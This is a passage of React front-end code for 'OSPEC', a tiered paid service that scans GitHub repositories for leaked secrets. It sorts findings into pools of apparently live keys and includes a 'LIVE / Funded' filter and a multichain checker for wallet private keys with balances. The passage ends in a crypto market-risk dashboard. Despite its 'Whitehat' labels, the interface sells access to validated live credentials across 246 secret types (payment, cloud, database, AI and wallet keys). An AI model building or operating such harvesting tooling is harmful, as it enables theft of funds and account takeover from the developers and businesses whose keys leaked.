                  <kbd className="rounded border border-border bg-card px-1 py-0.5 text-foreground">4</kbd>
                  <span>High</span>
                  <kbd className="rounded border border-border bg-card px-1 py-0.5 text-foreground">5</kbd>
                  <span>Whitehat</span>
                  <kbd className="rounded border border-border bg-card px-1 py-0.5 text-foreground">6</kbd>
                  <span>{isRu ? "Отсев" : "Sieve"}</span>
                  <kbd className="rounded border border-border bg-card px-1 py-0.5 text-foreground">←/→</kbd>
                  <span>{isRu ? "стр." : "page"}</span>
                </div>
              </div>

              {/* Row 1: Primary Mode Pills + Severity + Daemon Controls */}
              <div className="flex flex-wrap items-center justify-between gap-2 font-mono text-[11px]">
                <div className="flex flex-wrap items-center gap-1.5">
                  <button
                    type="button"
                    onClick={() => {
                      setInput1("");
                      setOspecSeverity("");
                      setOspecCategory("ALL");
                      setOspecClsFilter("REAL");
                      setOspecOnlyReal(true);
                      setOspecOnlyLive(false);
                      runOspecWithFilters({ q: "", sev: "", cat: "ALL", cls: "REAL", real: true, live: false, offset: 0 });
                    }}
                    className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                      !ospecSeverity && ospecClsFilter === "REAL" && !ospecOnlyLive && !input1 && ospecCategory === "ALL"
                        ? "border-primary bg-primary/15 text-primary shadow-sm"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    🔍 {isRu ? "Последние REAL" : "Recent REAL"} <span className="opacity-60 text-[9px]">[1]</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      const next = ospecSeverity === "CRITICAL" ? "" : "CRITICAL";
                      setOspecSeverity(next);
                      runOspecWithFilters({ sev: next, offset: 0 });
                    }}
                    className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                      ospecSeverity === "CRITICAL"
                        ? "border-destructive bg-destructive/20 text-destructive"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    🔴 Critical <span className="opacity-60 text-[9px]">[3]</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      const next = ospecSeverity === "HIGH" ? "" : "HIGH";
                      setOspecSeverity(next);
                      runOspecWithFilters({ sev: next, offset: 0 });
                    }}
                    className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                      ospecSeverity === "HIGH"
                        ? "border-primary bg-primary/20 text-primary"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    🟠 High <span className="opacity-60 text-[9px]">[4]</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      if (rank < 2) {
                        setError(
                          isRu
                            ? "🔥 Фильтр живых ключей с балансом (LIVE / Funded) доступен начиная с тарифа RAW."
                            : "🔥 LIVE / Funded filter requires RAW or BLACKBOX tier."
                        );
                        return;
                      }
                      const next = !ospecOnlyLive;
                      setOspecOnlyLive(next);
                      runOspecWithFilters({ live: next, offset: 0 });
                    }}
                    className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                      ospecOnlyLive
                        ? "border-amber-500/60 bg-amber-500/20 text-amber-300"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    🔥 {isRu ? "LIVE / С балансом" : "LIVE / Funded"} <span className="opacity-60 text-[9px]">[2]</span>
                    {rank < 2 && <span className="ml-1 rounded bg-black/40 px-1 py-0.5 text-[9px] text-amber-300">🔒 RAW+</span>}
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      if (rank < 3) {
                        setError(
                          isRu
                            ? "🧪 Обратный отсев (проверка пулов SUSPECT и TEST на скрытые боевые ключи) доступен эксклюзивно на тарифе BLACKBOX."
                            : "🧪 Reverse-Sieve (SUSPECT / TEST pools) requires BLACKBOX tier."
                        );
                        return;
                      }
                      const nextCls = ospecClsFilter === "REAL" ? "SUSPECT" : "REAL";
                      const nextReal = nextCls === "REAL";
                      setOspecClsFilter(nextCls);
                      setOspecOnlyReal(nextReal);
                      runOspecWithFilters({ cls: nextCls, real: nextReal, offset: 0 });
                    }}
                    className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                      ospecClsFilter !== "REAL"
                        ? "border-purple-500/60 bg-purple-500/20 text-purple-300"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    🧪 {isRu ? "Обратный отсев (TEST / SUSPECT)" : "Reverse-Sieve (TEST / SUSPECT)"}{" "}
                    <span className="opacity-60 text-[9px]">[6]</span>
                    {rank < 3 && <span className="ml-1 rounded bg-black/40 px-1 py-0.5 text-[9px] text-purple-300">🔒 BLACKBOX</span>}
                  </button>
                </div>

                {/* Daemon Controls (BLACKBOX exclusive) */}
                <div className="flex flex-wrap items-center gap-1.5">
                  <button
                    type="button"
                    disabled={ospecDaemonBusy}
                    onClick={async () => {
                      if (rank < 3) {
                        setError(
                          isRu
                            ? "🔒 Управление боевыми демонами OSPEC (Авто-Скан в /dev/shm) доступно только на тарифе BLACKBOX."
                            : "🔒 OSPEC Daemon Control requires BLACKBOX tier."
                        );
                        return;
                      }
                      setOspecDaemonBusy(true);
                      setOspecDaemonMsg(null);
                      try {
                        const res = await fetch(`${API_BASE}/api/tools/ospec-daemon-control`, {
                          method: "POST",
                          headers: { "Content-Type": "application/json", ...authHeaders() },
                          body: JSON.stringify({ action: "toggle_watcher" }),
                        });
                        const d = await res.json().catch(() => ({}));
                        if (!res.ok) throw new Error(d.detail || `HTTP ${res.status}`);
                        const isNowRunning = Boolean(d?.status?.ospec_watcher_running);
                        setOspecDaemonRunning(isNowRunning);
                        setOspecDaemonMsg(
                          d.message ||
                            (isNowRunning
                              ? isRu
                                ? "🟢 Турбо Авто-Скан OSPEC ЗАПУЩЕН (10 потоков /dev/shm + 8 ядер CPU)!"
                                : "🟢 OSPEC Turbo Auto-Scan RUNNING!"
                              : isRu
                              ? "⏸ Авто-Скан OSPEC поставлен НА ПАУЗУ."
                              : "⏸ OSPEC Auto-Scan PAUSED.")
                        );
                      } catch (e: any) {
                        setError(e.message);
                      } finally {
                        setOspecDaemonBusy(false);
                      }
                    }}
                    className={`inline-flex items-center gap-1.5 rounded-lg border px-3 py-1 font-bold transition-all disabled:opacity-50 ${
                      ospecDaemonRunning
                        ? "border-green-500/70 bg-green-500/20 text-green-300 hover:bg-amber-500 hover:border-amber-500 hover:text-black"
                        : "border-amber-500/70 bg-amber-500/20 text-amber-300 hover:bg-green-500 hover:border-green-500 hover:text-black"
                    }`}
                  >
                    {ospecDaemonBusy ? (
                      <Loader2 size={12} className="animate-spin" />
                    ) : (
                      <span
                        className={`h-2 w-2 rounded-full ${
                          ospecDaemonRunning ? "bg-green-400 animate-pulse" : "bg-amber-400"
                        }`}
                      />
                    )}
                    <span>
                      {ospecDaemonBusy
                        ? isRu
                          ? "Переключение…"
                          : "Switching…"
                        : ospecDaemonRunning
                        ? isRu
                          ? "🟢 Авто-Скан: РАБОТАЕТ (⏸ Стоп)"
                          : "🟢 Auto-Scan: ON (⏸ Pause)"
                        : isRu
                        ? "⏸ Авто-Скан: ПАУЗА (▶️ Старт)"
                        : "⏸ Auto-Scan: PAUSED (▶️ Start)"}
                    </span>
                    {rank < 3 && <span className="ml-1 rounded bg-black/40 px-1 py-0.5 text-[9px]">🔒 BB</span>}
                  </button>
                  <button
                    type="button"
                    disabled={ospecDaemonBusy}
                    onClick={async () => {
                      if (rank < 3) {
                        setError(
                          isRu
                            ? "🔒 Запуск ручного Турбо-Скана (50 репо в /dev/shm) доступен только на тарифе BLACKBOX."
                            : "🔒 Manual Turbo-Scan requires BLACKBOX tier."
                        );
                        return;
                      }
                      setOspecDaemonBusy(true);
                      setOspecDaemonMsg(null);
                      try {
                        const res = await fetch(`${API_BASE}/api/tools/ospec-daemon-control`, {
                          method: "POST",
                          headers: { "Content-Type": "application/json", ...authHeaders() },
                          body: JSON.stringify({ action: "run_batch" }),
                        });
                        const d = await res.json().catch(() => ({}));
                        if (!res.ok) throw new Error(d.detail || `HTTP ${res.status}`);
                        setOspecDaemonMsg(
                          d.message ||
                            (isRu
                              ? "⚡ Запущен ручной Турбо-скан 50 репозиториев в /dev/shm!"
                              : "⚡ Manual 50-repo Turbo scan started in /dev/shm!")
                        );
                      } catch (e: any) {
                        setError(e.message);
                      } finally {
                        setOspecDaemonBusy(false);
                      }
                    }}
                    className="rounded-lg border border-amber-500/60 bg-amber-500/15 px-2.5 py-1 font-semibold text-amber-300 transition-all hover:bg-amber-500 hover:text-black disabled:opacity-50"
                  >
                    ⚡ {isRu ? "Турбо-Скан (50 репо)" : "Turbo Scan (50)"}
                    {rank < 3 && <span className="ml-1 rounded bg-black/40 px-1 py-0.5 text-[9px]">🔒 BB</span>}
                  </button>
                  <button
                    type="button"
                    disabled={ospecDaemonBusy}
                    onClick={async () => {
                      if (rank < 2) {
                        setError(
                          isRu
                            ? "🔒 Запуск Мультичейн Дериватора и Live-Чекера (BTC xprv, NEAR, Keystore v3, PEM, EVM, API) доступен на тарифах RAW и BLACKBOX."
                            : "🔒 Multichain Live Verifier requires RAW or BLACKBOX tier."
                        );
                        return;
                      }
                      setOspecDaemonBusy(true);
                      setOspecDaemonMsg(null);
                      try {
                        const res = await fetch(`${API_BASE}/api/tools/ospec-daemon-control`, {
                          method: "POST",
                          headers: { "Content-Type": "application/json", ...authHeaders() },
                          body: JSON.stringify({ action: "run_checkers", batch_size: 80 }),
                        });
                        const d = await res.json().catch(() => ({}));
                        if (!res.ok) throw new Error(d.detail || `HTTP ${res.status}`);
                        setOspecDaemonMsg(
                          d.message ||
                            (isRu
                              ? "🧬 Мультичейн Live-Чек завершён!"
                              : "🧬 Multichain Live Verification completed!")
                        );
                        runOspecWithFilters({ offset: ospecOffset });
                      } catch (e: any) {
                        setError(e.message);
                      } finally {
                        setOspecDaemonBusy(false);
                      }
                    }}
                    className="rounded-lg border border-cyan-500/60 bg-cyan-500/15 px-2.5 py-1 font-semibold text-cyan-300 transition-all hover:bg-cyan-500 hover:text-black disabled:opacity-50"
                  >
                    🧬 {isRu ? "Мультичейн Live-Чек" : "Multichain Live Check"}
                    {rank < 2 && <span className="ml-1 rounded bg-black/40 px-1 py-0.5 text-[9px]">🔒 RAW+</span>}
                  </button>
                </div>
              </div>

              {ospecDaemonMsg && (
                <div className="flex items-center justify-between gap-2 rounded-lg border border-green-500/50 bg-green-500/15 px-3 py-2 font-mono text-[11px] font-semibold text-green-300">
                  <span>{ospecDaemonMsg}</span>
                  <button
                    type="button"
                    onClick={() => setOspecDaemonMsg(null)}
                    className="text-muted-foreground hover:text-foreground"
                  >
                    ✕
                  </button>
                </div>
              )}

              {/* Row 2: 7 Structured Secret Category Families (Whitehat POS/Restaurants, FinTech, AI/Voice, Cloud/DB, Comms/OTA, Wallets/RPC) */}
              <div className="space-y-1.5 rounded-xl border border-border/70 bg-background/40 p-2.5 font-mono text-[10px]">
                <div className="flex flex-wrap items-center gap-1.5">
                  <span className="text-muted-foreground font-semibold mr-1">
                    {isRu ? "📂 Семейство ключей:" : "📂 Secret Family:"}
                  </span>
                  {[
                    { id: "ALL", labelRu: "🌐 Все (246 сигн.)", labelEn: "🌐 All (246 sigs)", minR: 1 },
                    { id: "WHITEHAT_POS_BIZ", labelRu: "🍔 Whitehat: Рестораны / POS / SaaS [5]", labelEn: "🍔 Whitehat: POS / Restaurants / SaaS [5]", minR: 2 },
                    { id: "FINTECH_ECOMM", labelRu: "💳 Платежи / Банки / Магазины", labelEn: "💳 FinTech / E-Commerce / Banks", minR: 1 },
                    { id: "AI_VOICE_LLM", labelRu: "🤖 AI, LLM & Голосовые боты", labelEn: "🤖 AI, LLM & Voice Bots", minR: 1 },
                    { id: "CLOUD_DB_BAAS", labelRu: "☁️ Базы данных & Облака", labelEn: "☁️ Databases & Cloud BaaS", minR: 1 },
                    { id: "COMMS_MOBILE_OTA", labelRu: "📱 WhatsApp / Почта / Mobile OTA", labelEn: "📱 WhatsApp / Email / Mobile OTA", minR: 1 },
                    { id: "WEB3_WALLETS_RPC", labelRu: "🔑 Кошельки, Сиды & Web3 RPC", labelEn: "🔑 Wallets, Seeds & Web3 RPC", minR: 1 },
                  ].map((cat) => {
                    const cnt = cat.id === "ALL" ? undefined : result?.category_counts?.[cat.id];
                    const activeCat = ospecCategory === cat.id;
                    return (
                      <button
                        key={cat.id}
                        type="button"
                        onClick={() => {
                          if (rank < cat.minR) {
                            setError(
                              isRu
                                ? "🍔 Категория Whitehat Bounty (Рестораны, POS-терминалы, Доставка, B2B SaaS) доступна на тарифах RAW и BLACKBOX."
                                : "🍔 Whitehat Bounty category requires RAW or BLACKBOX tier."
                            );
                            return;
                          }
                          setOspecCategory(cat.id);
                          setInput1("");
                          const keepLive = cat.id === "WEB3_WALLETS_RPC" ? ospecOnlyLive : false;
                          if (!keepLive) setOspecOnlyLive(false);
                          runOspecWithFilters({ cat: cat.id, q: "", live: keepLive, offset: 0 });
                        }}
                        className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                          activeCat
                            ? "border-primary bg-primary text-primary-foreground shadow"
                            : "border-border bg-card text-muted-foreground hover:border-primary/40 hover:text-foreground"
                        }`}
                      >
                        <span>{isRu ? cat.labelRu : cat.labelEn}</span>
                        {cnt !== undefined && (
                          <span className={`ml-1 font-bold ${activeCat ? "text-primary-foreground" : "text-primary"}`}>
                            ({fmt(cnt, 0)})
                          </span>
                        )}
                        {rank < cat.minR && <span className="ml-1 rounded bg-black/40 px-1 py-0.5 text-[8px] text-amber-300">🔒 RAW+</span>}
                      </button>
                    );
                  })}
                </div>

                {/* Row 3: Dropdown Lists (Exact Signature Picker + Pool Selector + Repo Verticals) */}
                <div className="grid grid-cols-1 gap-2 pt-1.5 sm:grid-cols-3 border-t border-border/50">
                  {/* Dropdown 1: Pick any of the 246 secret signatures grouped by family */}
                  <div className="flex items-center gap-1.5">
                    <span className="text-muted-foreground shrink-0">{isRu ? "🔑 Сигнатура:" : "🔑 Signature:"}</span>
                    <select
                      value={input1}
                      onChange={(e) => {
                        const val = e.target.value;
                        setInput1(val);
                        setOspecCategory("ALL");
                        setOspecOnlyLive(false);
                        runOspecWithFilters({ q: val, cat: "ALL", live: false, offset: 0 });
                      }}
                      className="w-full rounded-lg border border-border bg-card px-2.5 py-1.5 font-mono text-[11px] text-foreground outline-none focus:border-primary"
                    >
                      <option value="">{isRu ? "— Все 246 сигнатур (выберите из списка) —" : "— All 246 signatures (select from list) —"}</option>
                      {result?.kind_stats?.length > 0 && (
                        <optgroup label={isRu ? "🔥 Активные в базе (с числом находок REAL)" : "🔥 Active in DB (with REAL counts)"}>
                          {result.kind_stats.map((ks: any) => {
                            const sk = ks.short_kind || String(ks.kind || "").replace("secret:", "");
                            return (
                              <option key={sk} value={sk}>
                                {sk} ({ks.real} REAL{ks.suspect ? ` · ${ks.suspect} SUSP` : ""})
                              </option>
                            );
                          })}
                        </optgroup>
                      )}
                      <optgroup label={isRu ? "🍔 Рестораны, POS-кассы и Доставка (Whitehat)" : "🍔 Restaurants, POS & Food Delivery (Whitehat)"}>
                        <option value="toast_pos_key">toast_pos_key — Toast POS Restaurant API</option>
                        <option value="iiko_poster_rkeeper_key">iiko_poster_rkeeper_key — iiko / Syrve / Poster POS / R-Keeper</option>
                        <option value="clover_pos_token">clover_pos_token — Clover POS Terminal</option>
                        <option value="lightspeed_pos_key">lightspeed_pos_key — Lightspeed Restaurant/Retail POS</option>
                        <option value="doordash_drive_key">doordash_drive_key — DoorDash Drive API</option>
                        <option value="ubereats_api_secret">ubereats_api_secret — UberEats / Uber Direct POS</option>
                        <option value="delivery_platform_key">delivery_platform_key — Deliveroo / Wolt / Glovo / Stuart</option>
                        <option value="restaurant_booking_key">restaurant_booking_key — SevenRooms / OpenTable / Resy</option>
                      </optgroup>
                      <optgroup label={isRu ? "💳 Платежи, Банки и E-Commerce" : "💳 FinTech, Banking & E-Commerce"}>
                        <option value="stripe_live">stripe_live — Stripe Live Secret Key (sk_live_...)</option>
                        <option value="stripe_whsec">stripe_whsec — Stripe Webhook Secret (whsec_...)</option>
                        <option value="woocommerce_consumer_secret">woocommerce_consumer_secret — WooCommerce Store (cs_...)</option>
                        <option value="shopify_token">shopify_token — Shopify Admin/Custom App (shpat_...)</option>
                        <option value="square_access">square_access — Square POS & Payments (sq0atp...)</option>
                        <option value="plaid_secret_key">plaid_secret_key — Plaid Banking API</option>
                        <option value="mollie_live_key">mollie_live_key — Mollie Live Acquiring (live_...)</option>
                        <option value="paddle_live_apikey">paddle_live_apikey — Paddle Billing (pdl_live_...)</option>
                        <option value="lemonsqueezy_api_key">lemonsqueezy_api_key — LemonSqueezy API</option>
                        <option value="mercury_bank_token">mercury_bank_token — Mercury Bank Production Token</option>
                        <option value="revolut_business_key">revolut_business_key — Revolut Business (oa_prod_...)</option>
                        <option value="wise_api_token">wise_api_token — Wise Business API</option>
                        <option value="cis_acquiring_secret">cis_acquiring_secret — ЮKassa / CloudPayments / Tinkoff</option>
                      </optgroup>
                      <optgroup label={isRu ? "🤖 AI, LLM и Голосовые боты (Колл-центры)" : "🤖 AI, LLMs & Voice Agents"}>
                        <option value="openai_key">openai_key — OpenAI API Key (sk-proj-...)</option>
                        <option value="anthropic_key">anthropic_key — Anthropic Claude (sk-ant-...)</option>
                        <option value="gemini_key">gemini_key — Google Gemini / Firebase (AIzaSy...)</option>
                        <option value="voice_ai_agent_key">voice_ai_agent_key — Vapi / Retell AI / Bland AI / Cartesia</option>
                        <option value="elevenlabs_api_key">elevenlabs_api_key — ElevenLabs Voice AI</option>
                        <option value="deepgram_api_key">deepgram_api_key — Deepgram STT/Voice</option>
                        <option value="livekit_api_secret">livekit_api_secret — LiveKit WebRTC / Voice</option>
                        <option value="groq_api_key">groq_api_key — Groq Cloud (gsk_...)</option>
                        <option value="perplexity_api_key">perplexity_api_key — Perplexity AI (pplx-...)</option>
                        <option value="replicate_api_token">replicate_api_token — Replicate (r8_...)</option>
                        <option value="pinecone_api_key">pinecone_api_key — Pinecone Vector DB (pcsk_...)</option>
                        <option value="ai_search_tool_key">ai_search_tool_key — Tavily Search (tvly-...)</option>
                      </optgroup>
                      <optgroup label={isRu ? "☁️ Базы данных, Облака и BaaS" : "☁️ Databases, Cloud & BaaS"}>
                        <option value="postgres_uri">postgres_uri — PostgreSQL Production URI</option>
                        <option value="mongodb_uri">mongodb_uri — MongoDB Atlas URI (mongodb+srv://)</option>
                        <option value="redis_uri">redis_uri — Redis URI</option>
                        <option value="supabase_service_key">supabase_service_key — Supabase service_role Key</option>
                        <option value="neon_api_key">neon_api_key — Neon Serverless Postgres (napi_...)</option>
                        <option value="upstash_qstash_token">upstash_qstash_token — Upstash Redis / QStash</option>
                        <option value="convex_deploy_key">convex_deploy_key — Convex BaaS Deploy Key</option>
                        <option value="appwrite_api_key">appwrite_api_key — Appwrite Secret Key</option>
                        <option value="aws_secret_access_key">aws_secret_access_key — AWS Secret Access Key</option>
                        <option value="gcp_sa_json">gcp_sa_json — Google Cloud Service Account JSON</option>
                      </optgroup>
                      <optgroup label={isRu ? "📱 Почта, WhatsApp, СМС, Мобилки и Медиа" : "📱 WhatsApp, Email, SMS, Mobile OTA & Media"}>
                        <option value="whatsapp_cloud_token">whatsapp_cloud_token — WhatsApp Business Cloud (EAA...)</option>
                        <option value="expo_access_token">expo_access_token — Expo React Native OTA Token</option>
                        <option value="resend_api_key">resend_api_key — Resend Email API (re_...)</option>
                        <option value="brevo_sendinblue_key">brevo_sendinblue_key — Brevo / Sendinblue (xkeysib-...)</option>
                        <option value="cloudinary_url">cloudinary_url — Cloudinary Media Storage (cloudinary://)</option>
                        <option value="mapbox_secret_token">mapbox_secret_token — Mapbox Secret Token (sk.eyJ1...)</option>
                        <option value="telegram_bot">telegram_bot — Telegram Bot Token</option>
                        <option value="slack_token">slack_token — Slack Bot/User Token (xoxb-...)</option>
                      </optgroup>
                    </select>
                  </div>

                  {/* Dropdown 2: Classification Pool Selector (REAL vs SUSPECT vs TEST reverse-sieve) */}
                  <div className="flex items-center gap-1.5">
                    <span className="text-muted-foreground shrink-0">{isRu ? "🧪 Пул БД:" : "🧪 DB Pool:"}</span>
                    <select
                      value={ospecClsFilter}
                      onChange={(e) => {
                        const v = e.target.value;
                        if (v !== "REAL" && rank < 3) {
                          setError(
                            isRu
                              ? "🧪 Доступ к пулам SUSPECT и TEST (обратный отсев) открыт эксклюзивно на тарифе BLACKBOX."
                              : "🧪 SUSPECT & TEST reverse-sieve pools require BLACKBOX tier."
                          );
                          return;
                        }
                        const isR = v === "REAL";
                        setOspecClsFilter(v);
                        setOspecOnlyReal(isR);
                        runOspecWithFilters({ cls: v, real: isR, offset: 0 });
                      }}
                      className="w-full rounded-lg border border-border bg-card px-2.5 py-1.5 font-mono text-[11px] text-foreground outline-none focus:border-primary"
                    >
                      <option value="REAL">{isRu ? "🟢 Пул REAL — Подтверждённые боевые (L2.5)" : "🟢 REAL Pool — Verified Live/Prod"}</option>
                      <option value="SUSPECT">{isRu ? "🟡 Пул SUSPECT — Подозрительные (Отсев) [BLACKBOX]" : "🟡 SUSPECT Pool — Reverse-Sieve [BLACKBOX]"}</option>
                      <option value="TEST">{isRu ? "🔬 Пул TEST — Тестовый отсев (1.1M) [BLACKBOX]" : "🔬 TEST Pool — Raw Test Sieve [BLACKBOX]"}</option>
                      <option value="ALL">{isRu ? "🌐 Все пулы вместе (REAL + SUSPECT + TEST) [BLACKBOX]" : "🌐 All Pools Combined [BLACKBOX]"}</option>
                    </select>
                  </div>

                  {/* Dropdown 3: Repo Vertical Selector */}
                  <div className="flex items-center gap-1.5">
                    <span className="text-muted-foreground shrink-0">{isRu ? "🌐 Вертикаль:" : "🌐 Vertical:"}</span>
                    <select
                      value={ospecVertical}
                      onChange={(e) => {
                        const v = e.target.value;
                        setOspecVertical(v);
                        runOspecWithFilters({ vert: v, offset: 0 });
                      }}
                      className="w-full rounded-lg border border-border bg-card px-2.5 py-1.5 font-mono text-[11px] text-foreground outline-none focus:border-primary"
                    >
                      <option value="ALL">{isRu ? "🌐 Все 6 вертикалей репозиториев" : "🌐 All 6 Repository Verticals"}</option>
                      <option value="WEB3_DEFI">⛓️ Web3 & DeFi ({fmt(result?.db_stats?.by_vertical?.WEB3_DEFI ?? 0, 0)})</option>
                      <option value="AI_AGENTS">🤖 AI, LLM & MCP ({fmt(result?.db_stats?.by_vertical?.AI_AGENTS ?? 0, 0)})</option>
                      <option value="STARTUP_SAAS">🚀 Startups, POS & SaaS ({fmt(result?.db_stats?.by_vertical?.STARTUP_SAAS ?? 0, 0)})</option>
                      <option value="INFRA_CLOUD">☁️ Infra, DevOps & Cloud ({fmt(result?.db_stats?.by_vertical?.INFRA_CLOUD ?? 0, 0)})</option>
                      <option value="QUANT_HFT">📈 Quant, Algo & HFT ({fmt(result?.db_stats?.by_vertical?.QUANT_HFT ?? 0, 0)})</option>
                      <option value="DORK_LEAKS">🔑 Secret Dorks ({fmt(result?.db_stats?.by_vertical?.DORK_LEAKS ?? 0, 0)})</option>
                    </select>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {error && (
        <div className="flex items-start gap-2 rounded-xl border border-destructive/40 bg-destructive/10 p-4 font-mono text-xs text-destructive">
          <AlertTriangle size={14} className="mt-0.5 shrink-0" />
          <span>{error}</span>
        </div>
      )}

      <div ref={activeToolResultRef} className="scroll-mt-20">
        {openedHistoryBanner && result && (
          <div className="mb-3 flex items-center justify-between gap-2 rounded-xl border border-green-500/60 bg-green-500/15 px-4 py-2.5 font-mono text-xs font-semibold text-green-300 shadow-sm">
            <span>✅ {openedHistoryBanner}</span>
            <button
              type="button"
              onClick={() => setOpenedHistoryBanner(null)}
              className="rounded px-2 py-0.5 text-muted-foreground hover:bg-black/20 hover:text-foreground"
            >
              ✕
            </button>
          </div>
        )}
      </div>

      {/* RESULTS */}
      {(() => {
        const renderMarketDossier = (result: any, onClose?: () => void) => {
          if (!result) return null;

          const score = Math.min(100, Math.max(0, Number(result.score ?? 0)));
          const conf = Math.min(100, Math.max(0, Number(result.confidence ?? 100)));
          const manip = Math.min(100, Math.max(0, Number(result.manipulation_risk ?? 0)));
          const fundWeak = Math.min(100, Math.max(0, Number(result.fundamental_weakness ?? 0)));
          const crowd = Math.min(100, Math.max(0, Number(result.crowd_overcrowding ?? 0)));
          const organic = Math.min(100, Math.max(0, Number(result.organic_probability ?? 100)));

          const isHighRisk = result.level === "CRITICAL" || result.level === "HIGH" || score >= 60;
          const isMedRisk = !isHighRisk && (result.level === "MEDIUM" || score >= 30);
          const accentStroke = isHighRisk ? "#ef4444" : isMedRisk ? "#f59e0b" : "#10b981";
          const accentBadge = isHighRisk
            ? "bg-destructive/20 text-destructive border-destructive/40"
            : isMedRisk
            ? "bg-amber-500/20 text-amber-400 border-amber-500/40"
            : "bg-emerald-500/15 text-emerald-400 border-emerald-500/40";

          // 4-Axis Radar Polygon coordinates (center 90,90, radius 62)
          // Top: Manipulation (0,-1), Right: Crowd (+1,0), Bottom: FundWeak (0,+1), Left: Organic (-1,0)
          const rMax = 60;
          const cx = 90;
          const cy = 90;
          const pTop = `${cx},${cy - (manip / 100) * rMax}`;
          const pRight = `${cx + (crowd / 100) * rMax},${cy}`;
          const pBottom = `${cx},${cy + (fundWeak / 100) * rMax}`;
          const pLeft = `${cx - (organic / 100) * rMax},${cy}`;
          const radarPoints = `${pTop} ${pRight} ${pBottom} ${pLeft}`;

          // Momentum curve points from 30d -> 7d -> 24h -> Now (0%)
          const ch30 = Number(result.snapshot?.price_change_30d ?? 0);
          const ch7 = Number(result.snapshot?.price_change_7d ?? 0);
          const ch24 = Number(result.snapshot?.price_change_24h ?? 0);
          // Relative historical levels compared to current price = 100
          const rel30 = 100 / (1 + ch30 / 100 || 1);
          const rel7 = 100 / (1 + ch7 / 100 || 1);
          const rel24 = 100 / (1 + ch24 / 100 || 1);
          const relNow = 100;
          const relArr = [rel30, rel7, rel24, relNow];
          const minRel = Math.min(...relArr) * 0.985;
          const maxRel = Math.max(...relArr) * 1.015;
          const mapY = (v: number) => {
            const norm = (v - minRel) / Math.max(0.0001, maxRel - minRel);
            return Math.round(54 - norm * 42);
          };
          const y0 = mapY(rel30);
          const y1 = mapY(rel7);
          const y2 = mapY(rel24);
          const y3 = mapY(relNow);
          const curvePath = `M 16 ${y0} C 55 ${y0}, 65 ${y1}, 95 ${y1} C 125 ${y1}, 135 ${y2}, 168 ${y2} C 195 ${y2}, 210 ${y3}, 244 ${y3}`;
          const areaPath = `${curvePath} L 244 62 L 16 62 Z`;
          const curveColor = ch24 >= 0 ? "#10b981" : "#ef4444";

          // Positioning metrics
          const retailLong =
            result.snapshot?.long_account_pct !== null && result.snapshot?.long_account_pct !== undefined
              ? Math.min(100, Math.max(0, Number(result.snapshot.long_account_pct)))
              : null;
          const topLong =
            result.snapshot?.top_trader_long_pct !== null && result.snapshot?.top_trader_long_pct !== undefined
              ? Math.min(100, Math.max(0, Number(result.snapshot.top_trader_long_pct)))
              : null;
          const topDelta =
            result.snapshot?.top_trader_delta !== null && result.snapshot?.top_trader_delta !== undefined
              ? Number(result.snapshot.top_trader_delta)
              : topLong !== null && retailLong !== null
              ? Math.round(topLong - retailLong)
              : null;

          // Taker Buy/Sell
          const takerBuyPct =
            result.snapshot?.taker_buy_ratio !== null && result.snapshot?.taker_buy_ratio !== undefined
              ? Math.min(100, Math.max(0, Number(result.snapshot.taker_buy_ratio) * 100))
              : null;

          // Orderbook Depth ±2%
          const bid2 = Number(result.snapshot?.bid_depth_2pct ?? 0);
          const ask2 = Number(result.snapshot?.ask_depth_2pct ?? 0);
          const depthTot = Number(result.snapshot?.depth_2pct_total ?? bid2 + ask2);
          const bidShare = depthTot > 0 ? Math.min(100, Math.max(0, (bid2 / depthTot) * 100)) : 50;

          // Multi-exchange OI
          const oiBn = Number(result.snapshot?.oi_binance ?? result.snapshot?.oi_usdt ?? 0);
          const oiOkx = Number(result.snapshot?.oi_okx ?? 0);
          const oiBb = Number(result.snapshot?.oi_bybit ?? 0);
          const oiTotalMulti = Number(result.snapshot?.oi_total_multi ?? oiBn + oiOkx + oiBb);
          const oiMaxEx = Math.max(oiBn, oiOkx, oiBb, 1);

          // Radial speedometer dash
          const rad = 52;
          const circum = 2 * Math.PI * rad;
          const arcLen = circum * 0.75; // 270 degree gauge
          const arcOffset = arcLen - (score / 100) * arcLen;

          return (
            <div className="space-y-4 font-mono">
              {/* ══════════════════════════════════════════════════════════════════
                  SECTION 1: HERO COMMAND BRIDGE (RADIAL GAUGE + 4-AXIS RADAR + SPOT CURVE)
                  ══════════════════════════════════════════════════════════════════ */}
              <div className="rounded-xl border border-border bg-card p-5 space-y-5 shadow-lg">
                {/* Top Action & Status Bar */}
                <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border pb-3.5">
                  <div className="flex flex-wrap items-center gap-2.5">
                    <span className="rounded-xl border border-primary/40 bg-primary/15 px-3 py-1 text-sm font-black tracking-wide text-primary">
                      ${result.symbol}
                    </span>
                    <span className={`rounded-full px-3.5 py-1 text-xs font-bold border ${accentBadge}`}>
                      {isHighRisk ? "🔴" : isMedRisk ? "🟡" : "🟢"}{" "}
                      {isRu ? "ИНДЕКС РИСКА РЫНКА:" : "MARKET RISK:"} {score}/100 ({result.level})
                    </span>
                    <span className="rounded-lg border border-border bg-background px-2.5 py-1 text-[11px] text-muted-foreground">
                      {result.pump_verdict || (isRu ? "✅ Нет признаков искусственного пампа" : "✅ No significant pump indicators")}
                    </span>
                    {result.snapshot?.market_regime && (
                      <span className="rounded-lg border border-cyan-500/40 bg-cyan-500/10 px-2.5 py-1 text-[11px] font-bold text-cyan-300">
                        ⚡ {result.snapshot.market_regime}
                      </span>
                    )}
                    {result.github_repo && (
                      <>
                        <a
                          href={`https://github.com/${result.github_repo}`}
